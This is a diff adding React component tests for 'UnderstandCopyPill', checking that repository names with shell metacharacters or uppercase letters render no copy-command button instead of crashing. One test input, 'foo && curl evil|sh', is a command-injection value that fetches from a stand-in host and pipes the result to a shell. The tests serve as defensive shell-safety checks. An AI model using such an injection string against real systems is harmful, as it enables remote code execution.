@@ -156,3 +156,20 @@ describe('UnderstandCopyPill — D-5.1-10 constraint: NO cn/clsx/CVA/hex literal
     }
   })
 })
+
+describe('UnderstandCopyPill — Test 6: non-slug repo names never crash the render (shell-safety guard)', () => {
+  // buildUnderstandCommand throws TypeError for names outside the slug charset
+  // (Phase 14 review fix). The pill must swallow that and render no copy pill
+  // instead of crashing the coverage row.
+  it('renders without throwing and shows NO pill for a repo name with shell metacharacters', () => {
+    render(withToast(<UnderstandCopyPill family="agenticapps" repo="foo && curl evil|sh" state="missing" />))
+    expect(screen.queryByRole('button')).toBeNull()
+  })
+
+  it('renders without throwing and shows NO pill for an uppercase repo name', () => {
+    render(withToast(<UnderstandCopyPill family="agenticapps" repo="MyRepo" state="stale" viewerUrl={VIEWER_URL} />))
+    expect(screen.queryByRole('button')).toBeNull()
+    // The viewer link is independent of the command and stays rendered
+    expect(screen.getByRole('link', { name: /open knowledge graph/i })).toBeTruthy()
+  })
+})
